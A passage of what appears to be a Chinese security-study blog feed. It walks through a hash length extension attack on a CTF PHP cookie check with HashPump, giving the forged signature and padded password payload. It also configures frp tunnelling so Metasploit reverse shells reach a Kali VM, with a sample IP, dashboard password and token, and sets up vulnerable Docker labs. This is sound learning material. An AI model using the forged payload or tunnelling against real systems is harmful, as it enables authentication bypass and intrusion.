bytes，剩下的8 bytes表示这块明文消息未填充前的长度</p><p><strong>填充</strong><br>在明文消息的最后一块一般是不满足56ytes时就对这个最后一块进行padding填充，填充至56 bytes的位置，，填充方式为，在16进制下，我们需要在消息后添加一个80，然后加0，直至56 bytes时</p><p><strong>变量计算</strong><br>哈希加密的在分块之后，每块在进行加密运算之前都会有一个链变量(key)，有每一个链变量与该块进行运算，除了第一块，每一块相对应的链变量都是前一块进行哈希计算后的字符串生成的，也就是说，每一块都对下一块有影响，（有点类似于CBC了），而第一块会有一个初始的链变量，为（无需考虑计算过程的细节）</p><p>A&#x3D;0x67452301</p><p>B&#x3D;0xefcdab89<br>C&#x3D;0x98badcfe</p><p>D&#x3D;0x10325476</p><p>而最后一块生成的链变量需要进行高低位互换（如：aabbccdd -&gt; ddccbbaa），再拼接在一起就是我们计算出来的哈希值</p><p>代码验证：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;welcome&#125;&#x27;</span></span><br><span class="line">secrets=os.urandom(<span class="number">15</span>)</span><br><span class="line">m=<span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">k1=sha256(secrets+m+m).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(k1)</span><br><span class="line">key=<span class="built_in">input</span>(<span class="string">&quot;输入key的16进制&quot;</span>)</span><br><span class="line">cipher=<span class="built_in">input</span>(<span class="string">&quot;输入哈希值&quot;</span>)</span><br><span class="line">s1=secrets+m+<span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;经过多次尝试后发现，在python中，输入16进制字符串时对格式最友好的</span></span><br><span class="line"><span class="string">如果输入为类似\x00\x00\x00\x00\x00\x80的字符串，</span></span><br><span class="line"><span class="string">进行encode转为字节串会生成\\x00\\x00\\x00\\x00\\x00\\x80的错误形式</span></span><br><span class="line"><span class="string">即使转为urlcode在转回来的时候也会有误差，可能是我python环境的问题</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在使用hashpump时</span></span><br><span class="line"><span class="string">signnature：已知的hash加密的字符串</span></span><br><span class="line"><span class="string">data:hash加密字符串中明文中已知的部分</span></span><br><span class="line"><span class="string">key length: 未知的字符串长度</span></span><br><span class="line"><span class="string">add:自己想添加的附值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">k2=sha256(s1).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(k2)</span><br><span class="line"><span class="keyword">if</span> cipher==k2:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="工具梭哈"><a href="#工具梭哈" class="headerlink" title="工具梭哈"></a>工具梭哈</h2><p>当然，此攻击已经有很多成熟的工具了，不用再这么麻烦的自己写脚本跑。</p><p>这里使用<strong>hashump</strong>就行</p><h3 id="1、HashPump安装"><a href="#1、HashPump安装" class="headerlink" title="1、HashPump安装"></a><strong>1、HashPump安装</strong></h3><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。</p><p>（至于别的文章提到了MD4、RIPEMD-160、SHA-0、WHIRLPOOL等也可以构造长度扩展攻击，等以后再研究。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">不行就 git clone https://gitee.com/ljcppp/HashPump.git</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：</p><p>（注意还是得先安装了libssl-dev）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install hashpumpy</span><br></pre></td></tr></table></figure><p>推荐在linux里使用，使用方法可以这样获取：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import hashpumpy</span><br><span class="line">&gt;&gt;&gt; help(hashpumpy.hashpump)</span><br></pre></td></tr></table></figure><h3 id="2、HashPump用法"><a href="#2、HashPump用法" class="headerlink" title="2、HashPump用法"></a><strong>2、HashPump用法</strong></h3><p>这里以一个实验吧题目为例，关键的代码大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret=&quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line">$username=&quot;admin&quot;;</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">if($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在题目里可以得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5($secret.&quot;adminadmin&quot;)的值为571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure><p>稍微整理下我们已经知道的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20</span><br><span class="line">而数据是admin</span><br><span class="line">签名（哈希值）是571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure><p>这时候我们使用HashPump，附加数据至少1位以上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hashpump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hashpump</span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure><p>就会得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure><p>第一个是新的签名，把它设置到cookies的getmein里。</p><p>第二个先把\x替换为%后，post提交</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure><p>就可以通过了。</p><p>-——</p><p>ps.提供一个基于HashPump的在线网站：</p><p><a href="http://sakurity.com/lengthextension">http://sakurity.com/lengthextension</a></p><p>（可能得翻了墙才可以访问，附加数据至少一位以上，message length为密文+数据的总长度，看不到”submit”键请刷新或者换浏览器）</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2024/05/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2024/05/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>学习中经常用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以<strong>通过frp工具将内网中的服务映射到公网IP地址的端口中</strong></p><p><strong>frp</strong> 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。<br>frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务<br><img src="https://bu.dusays.com/2024/05/13/6641a8dba2a28.png" alt="image-20240405214341242"></p><p>为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具</p><ul><li>公网服务器，这里我用的是CentOS7.6</li><li>frp服务端&#x2F;客户端工具，<a href="https://github.com/fatedier/frp/releases">github下载</a></li><li>内网服务器或本机，这里我用的是kali2020虚拟机</li></ul><h2 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>将frp文件上传到公网服务器 我这里是使用的Winscp</p><p>我这里上传的是gz压缩文件</p><p>直接解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf frp_0.44.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8db98fbe.png" alt="image-20240405223636139"></p><p>ok</p><p>然后需要修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入目录</span><br><span class="line">cd frp_0.33.0_linux_amd64/</span><br><span class="line"></span><br><span class="line"># 打开配置文件</span><br><span class="line">vi frps.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开后是这样的：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8db82c11.png" alt="image-20240405225051611"></p><p>将文件内容修改为如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 一、服务器的基本配置部分</span><br><span class="line"># 7000 是FRP服务端口，可以改</span><br><span class="line">bind_port = 7000</span><br><span class="line"># dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = frpadmin@2022</span><br><span class="line"># 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 服务器和客户机之间的心跳连接</span><br><span class="line">heartbeat_timeout = 30</span><br><span class="line">#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求</span><br><span class="line">token=frpToken@admin2022</span><br><span class="line"> </span><br><span class="line"># 二、添加的映射端口</span><br><span class="line">[common]</span><br><span class="line"># FRP服务器的公网ip</span><br><span class="line">server_addr = 【这里写自己的公网服务器地址】</span><br><span class="line">#例如：server_addr = 1.1.1.1</span><br><span class="line"></span><br><span class="line"># FRP服务器的，服务端口，这个可以改，不过客户端的也要一起改才行。</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 三、转发端口：[test01]、[test02] 这些没有任何意义，就是大致描述这个端口作用。</span><br><span class="line"># 每增加一个转发端口，复制下面的两行，然后将[]里面的和vhost_http_port_03改了就行了。</span><br><span class="line">#[test01]</span><br><span class="line">#vhost_http_port = 9001</span><br><span class="line"> </span><br><span class="line">#[test02]</span><br><span class="line">#vhost_tcp_port = 1315</span><br><span class="line">#转发端口配置，实际测试这里影响不大，主要取决于客户端的配置</span><br><span class="line">vhost_http_port = 9001</span><br><span class="line">vhost_ssh_port = 9002</span><br><span class="line">vhost_tcp_port = 9003</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = frpadmin@2022</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">heartbeat_timeout = 30</span><br><span class="line">token=frpToken@admin2022</span><br><span class="line">[common]</span><br><span class="line">server_addr = 124.223.91.44</span><br><span class="line">server_port = 7000</span><br><span class="line">vhost_http_port = 9001</span><br><span class="line">vhost_ssh_port = 9002</span><br><span class="line">vhost_tcp_port = 9003</span><br></pre></td></tr></table></figure><p>esc 然后:wq 保存并退出</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8dba04d9.png" alt="image-20240405232528251"></p><p>配置好后运行文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8db85b53.png" alt="image-20240405232610629"></p><p>7500端口就是frp的网页管理端口，可以访问（账号密码在配置文件中）</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>同样的方式将frp工具上传到kali虚拟机中，这里要确保kali是能够正常联网的，同样用tar命令解压，配置frpc.ini文件如下：</p><p>更服务端的操作一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 客户端配置</span><br><span class="line">[common]</span><br><span class="line">server_addr = 【这里写自己的公网服务器地址】</span><br><span class="line">#例如：server_addr = 1.1.1.1</span><br><span class="line">server_port = 7000          #frp服务端口要和服务端设定的一致</span><br><span class="line">token = frpToken@admin2022  #token要和服务端一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置http服务，可用于小程序开发、远程调试等，如果没有可以不写下面的</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 80   #本地需要映射的端口</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9001 #映射到服务端的端口</span><br><span class="line"></span><br><span class="line">#kali ssh</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 22</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9002  </span><br><span class="line"></span><br><span class="line">#tcp msfconsole</span><br><span class="line">[tcp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 9003</span><br><span class="line">custom_domains = 【这里写自己的公网服务器地址】</span><br><span class="line">remote_port = 9003</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8dbf4205.png" alt="image-20240405235232663"></p><p>这样应该就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/05/13/docker/"/>
      <url>/2024/05/13/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可抑制的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器完全使用沙盒机制，相互之间不会存在任何接口。几乎没有性能开销，可以很容易的在机器和数据中心运行。最重要的是，他们不依赖于任何语言、框架或者包装系统。</p><p>小知识：沙盒也叫沙箱（sandbox）。在计算机领域指一种虚拟技术，而且多用于计算机安全技术。安全软件可以让它在沙盒中运行，如果含有恶意行为，则禁止程序的进一步运行，而这不会对系统造成任何危害。</p><p>Docker是dotCloud公司开源的一个基于LXC的高级容器引擎，源码托管在Github上，基于go语言并且遵从Apache2.0协议开源。</p><h2 id="Docker容器技术与虚拟机的区别"><a href="#Docker容器技术与虚拟机的区别" class="headerlink" title="Docker容器技术与虚拟机的区别"></a>Docker容器技术与虚拟机的区别</h2><p>docker和容器技术和虚拟机技术，都是虚拟化技术。</p><p>docker有着比虚拟机更少的抽象层。 由于docker不需要Hypervisor实现硬件资源虚拟化，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。所以docker效率比虚拟机效率高。达到了秒级启动的地步。</p><p>docker相较于VM的优点：</p><blockquote><p>1、比VM小、快，Docker容器的尺寸减小相比于整个虚拟机大大简化了分布<br>到云和分发时间的开销。Docker启动一个容器实例时间仅仅需要几秒钟。</p><p>2、Docker是一个开放的平台，构建、发布和运行分布式应用程序。</p><p>3、开发人员不需要关系具体是哪个Linux操作系统</p><p>4、Google、微软（azure）、亚马逊、IBM等都支持docker。</p><p>5、Docker支持Unix&#x2F;Linux操作系统，也支持Windows和Mac。</p></blockquote><p>Docker局限性：<br>Docker用于应用程序时是最有用的，但并不包含数据。日志、数据库等通常放在Docker容器外。一个容器的镜像通常都很小，不用和存储大量数据，存储可以通过外部挂载等方式使用，比如：NFS、ipsan、MFS等 ，或者docker命令 ，-v映射磁盘分区。</p><p>总之，docker只用于计算，存储交给别人。</p><p>Docker特性。<br>文件系统隔离：每个进程容器运行在一个完全独立的根文件系统里。</p><p>资源隔离：系统资源，像CPU和内存等可以分配到不同的容器中，使用cgroup。<br>网络隔离：每个进程容器运行在自己的网路空间，虚拟接口和IP地址。</p><p>日志记录：Docker将收集到和记录的每个进程容器的标准流（stdout&#x2F;stderr&#x2F;stdin），用于实时检索或者批量检索</p><p>变更管理：容器文件系统的变更可以提交到新的镜像中，并可重复使用以创建更多的容器。无需使用模板或者手动配置。</p><p>交互式shell：Docker可以分配一个虚拟终端并且关联到任何容器的标准输出上，例如运行一个一次性交互shell。</p><h1 id="kali下docker安装"><a href="#kali下docker安装" class="headerlink" title="kali下docker安装"></a>kali下docker安装</h1><h2 id="Linux内核版本查看"><a href="#Linux内核版本查看" class="headerlink" title="Linux内核版本查看"></a>Linux内核版本查看</h2><blockquote><p>#安装docker要求内核版本kerner&gt;&#x3D;3.10<br>#为此，先检查当前Linux系统的内核版本<br><code>uname -a</code></p></blockquote><h2 id="更新apt"><a href="#更新apt" class="headerlink" title="更新apt"></a>更新apt</h2><blockquote><p>#新重写sources.list中内容，一个个字母删除太久了<br><code>cho &gt; /etc/apt/sources.list</code></p><p>#进入sources.lis重新编辑apt源<br><code>vim /etc/apt/sources.list</code></p><p>#直接CV大法写入下面的apt源</p><p>#阿里云<br><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</code><br><code>deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </code></p></blockquote><p>这一步在我实际安装时其实是没有执行的 不影响</p><h2 id="进行系统或工具更新"><a href="#进行系统或工具更新" class="headerlink" title="进行系统或工具更新"></a>进行系统或工具更新</h2><blockquote><p>进行系统或工具的更新（还是要挺久的 ）<br>注：当出现正在设定软件包界面时，直接按<code>tab+enter</code>进行确认<br><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</code></p><p>礼貌性清除更新缓存<br><code>apt-get clean</code></p></blockquote><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><blockquote><p>为什么采用apt安装？因为之后采用apt源安装Docker的其他组件时，新组件与已安装的Docker容器最为匹配。<br>apt-get install docker docker-compose</p><p>或<br>apt-get install docker.io</p></blockquote><p>我这里是第二个可以执行 第一个报错</p><h2 id="检验Docker"><a href="#检验Docker" class="headerlink" title="检验Docker"></a>检验Docker</h2><blockquote><p>启动docker服务 </p><p>service docker start</p></blockquote><blockquote><p>查看docker版本</p><p>docker -v</p></blockquote><blockquote><p>列出docker现有镜像 </p><p>docker images</p></blockquote><p>好像要root用户</p><p>因为我没有安装任何镜像 所以的镜像中为空</p><h2 id="Docker开机自启"><a href="#Docker开机自启" class="headerlink" title="Docker开机自启"></a>Docker开机自启</h2><blockquote><p>设置docker开机自启<br>systemctl enable docker</p></blockquote><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><h3 id="拉取环境"><a href="#拉取环境" class="headerlink" title="拉取环境"></a>拉取环境</h3><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以拉取 CVE-2017-7504 的漏洞环境为例。</span><br><span class="line">docker search testjboss    #搜索漏洞环境</span><br><span class="line">docker pull testjboss/jboss#拉取漏洞环境</span><br><span class="line">docker run -d -p 80:8080 testjboss/jboss:latest#根据testjboss/jboss镜像创建并运行容器</span><br><span class="line">ifconfig#查看已运行容器ip</span><br><span class="line">#kali中，使用浏览器访问http://IP#IP可为127.0.0.1</span><br><span class="line">docker ps#查看正在运行的容器</span><br><span class="line">docker exec -it e8f4844aabc1 /bin/bash#进入容器(id:e8f4844aabc1)</span><br><span class="line">exit#退出容器到宿主机（容器不会停止运行）</span><br><span class="line">docker stop 3b41c0c08430#关闭容器(id唯一标识，建议使用id)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a888aa457.png" alt="image-20240402231620258"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a889390c3.png" alt="image-20240402231637817"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a888e326c.png" alt="image-20240402231649876"></p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p>Docker搭建LAMP环境</p><blockquote><p>LAMP是指Linux+Apache+MYSQL+PHP 一个经典的网络架构</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull linode/lamp</span><br><span class="line">直接在Docker中拉取一个现成的LAMP镜</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a88933d07.png" alt="image-20240403000528688"></p><p>其实是比较慢的 但是可以通过切换Docker镜像源的方法加速</p><p>然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -p 8001:80 linode/lamp /bin/bash</span><br></pre></td></tr></table></figure><p>以linode&#x2F;lamp镜像创建容器并且将容器的80端口映射到本机8001端口</p><p>再分别输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure><p>命令启动服务</p><p><img src="https://bu.dusays.com/2024/05/13/6641a889424bf.png" alt="image-20240403001248397"></p><p>kali访问127.0.0.1：8001</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8877695d.png" alt="image-20240403001515272"></p><h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><p>Docker Compose搭建实验环境</p><p>Docker Compose是用于定义和运行多容器应用程序的工具</p><p>使用步骤：</p><blockquote><p>1.使用Dockerfile定义应用程序的环境</p><p>2.使用docker-compose.yml定义构成应用程序的服务，这样它们可以在隔离环境中一起运行</p><p>3.执行docker-compose up 命令来启动并运行整个应用程序</p></blockquote><p>安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a8892ea66.png" alt="image-20240403003730268"></p><p>检查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure><p>只要给出实验环境的docker-compose.yml文件  我们只需要新建文件夹，然后将docker-compose.yml文件放在该目录中，进入该目录执行<code>docker-compose up -d</code>命令即可构建环境并启动实验环境， -d参数表示后台运行 可根据需要填写</p><p>用docker compose搭建漏洞 CVE-2020-17518</p><p>docker-compose.yml：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line">services:</span><br><span class="line"> flink:</span><br><span class="line">   image: vulhub/flink:1.11.2</span><br><span class="line">   command: jobmanager</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;8081:8081&quot;</span><br><span class="line">    - &quot;6123:6123&quot;</span><br></pre></td></tr></table></figure><p>这里可能是yml文件的问题 最后在执行docker-compose up -d时报错了 但时步骤因该是没问题的</p><p>从这里的YAML文件可以看出 映射的有两个端口 8081和6123 其中8081为web服务端口</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#系统命令</span><br><span class="line">systemctl start docker#启动docker</span><br><span class="line">systemctl stop docker#停止docker</span><br><span class="line">systemctl restart docker#重启docker</span><br><span class="line">systemctl enable docker#设置docker开机自启</span><br><span class="line"> </span><br><span class="line">#基本命令</span><br><span class="line">docker version#查看docker版本</span><br><span class="line">docker info#查看docker详细信息</span><br><span class="line">docker --help#查看docker命令</span><br><span class="line"> </span><br><span class="line">#镜像命令</span><br><span class="line">docker images#查看docker镜像列表</span><br><span class="line">docker images -a#列出本地所有镜像</span><br><span class="line">docker images --digests#显示镜像的摘要信息</span><br><span class="line">docker search redis#从Docker Hub上查找redis镜像</span><br><span class="line">docker pull redis#从Docker Hub上下载redis镜像</span><br><span class="line">docker rmi 373f0984b070#删除IMAGE ID 为373f0984b070的镜像</span><br><span class="line">docker search 镜像名           #搜索镜像</span><br><span class="line">docker pull 镜像名 [标签]      #下载镜像（如果不写tag，默认是latest）</span><br><span class="line">docker rmi 镜像名 [标签]       #删除镜像    docker rmi -f $(docker images -aq)  删除全部镜像</span><br><span class="line">docker tag  镜像名:版本   新镜像名:版本    #复制镜像并且修改名称</span><br><span class="line">docker commit  -a &quot;xxx&quot;  -c &quot;xxx&quot; 镜像ID 名字：版本   #提交镜像 </span><br><span class="line">-a :提交的镜像作者；</span><br><span class="line">-c :使用Dockerfile指令来创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#运行命令</span><br><span class="line">#-p 6379:6379端口映射：前表示主机部分,后表示容器部分</span><br><span class="line">#-d在后台运行容器（不进入终端）并打印容器ID/容器名</span><br><span class="line">#--name myredis表示自定义容器名为myredis</span><br><span class="line">docker run -d -p 6379:6379 --name myredis redis:latest#根据镜像创建并运行容器</span><br><span class="line">--name = &quot;Name&quot;   容器名字</span><br><span class="line">-c   后面跟待完成的命令</span><br><span class="line">-d   以后台方式运行并且返回ID，启动守护进程式容器</span><br><span class="line">-i   使用交互方式运行容器，通常与t同时使用</span><br><span class="line">-t   为容器重新分配一个伪输入终端。也即启动交互式容器</span><br><span class="line">-p   指定容器端口    -p 容器端口:物理机端口  映射端口</span><br><span class="line">-P   随机指定端口</span><br><span class="line">-v   给容器挂载存储卷</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#容器命令</span><br><span class="line">docker container ls 或 docker ps#查看正在运行的容器</span><br><span class="line">docker container ls -a 或 docker ps -a#列出所有容器</span><br><span class="line">docker container start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker start 容器ID 或 容器名称#启动容器</span><br><span class="line">docker container stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker stop 容器ID 或 容器名称#停止容器</span><br><span class="line">docker container rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker rm 容器ID 或 容器名称#删除容器</span><br><span class="line">docker container logs -f 容器ID 或 容器名称#查看容器日志</span><br><span class="line">docker exec -it name /bin/bash #进入name（容器名/id）中开启交互式的终端，exit退出</span><br><span class="line"></span><br><span class="line">docker build  #创建镜像        -f：指定dockerfile文件路径   -t：镜像名字以及标签</span><br><span class="line">docker logs 容器实例的ID          #查看容器日志</span><br><span class="line">docker rename 旧名字  新名字      # 给容器重新命名</span><br><span class="line">docker top    容器实例的ID                  #查看容器内进程</span><br><span class="line">docker ps -a                    #列出所有容器（不加-a就是在运行的）</span><br><span class="line">docker rm      容器实例的ID                 #删除容器（正在运行容器不能删除，除非加-f选项）</span><br><span class="line">docker kill  容器实例的ID        #杀掉容器</span><br><span class="line">docker history   容器实例的ID    #查看docker镜像的变更历史</span><br><span class="line">docker start 容器实例的ID        #启动容器</span><br><span class="line">docker restart 容器实例的ID       #重启容器</span><br><span class="line">docker stop 容器实例的ID         #停止正在运行的容器</span><br><span class="line">docker attach /docker exec  容器实例的ID   #同为进入容器命令，不同的是attach连接终止会让容器退出后台运行，而exec不会。并且，docker attach是进入正在执行的终端，不会情动新的进程，而docker exec则会开启一个新的终端，可以在里面操作。</span><br><span class="line">docker image inspect  容器名称：容器标签       #查看容器内源数据</span><br><span class="line">docker cp  容器id：容器内路径   目的主机路径           #从容器内拷贝文件到主机（常用）或者从主机拷贝到容器（一般用挂载）</span><br><span class="line">exit                           #直接退出容器 </span><br><span class="line">crlt + P + Q                   #退出容器但是不终止运行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="docker-–help中文译解"><a href="#docker-–help中文译解" class="headerlink" title="docker –help中文译解"></a>docker –help中文译解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">docker [OPTIONS] COMMAND [arg...]</span><br><span class="line">       docker daemon [ --help | ... ]</span><br><span class="line">       docker [ --help | -v | --version ]</span><br><span class="line">A</span><br><span class="line">self-sufficient runtime for containers.</span><br><span class="line"> </span><br><span class="line">Options:</span><br><span class="line">  --config=~/.docker              Location of client config files  #客户端配置文件的位置</span><br><span class="line">  -D, --debug=false               Enable debug mode  #启用Debug调试模式</span><br><span class="line">  -H, --host=[]                   Daemon socket(s) to connect to  #守护进程的套接字（Socket）连接</span><br><span class="line">  -h, --help=false                Print usage  #打印使用</span><br><span class="line">  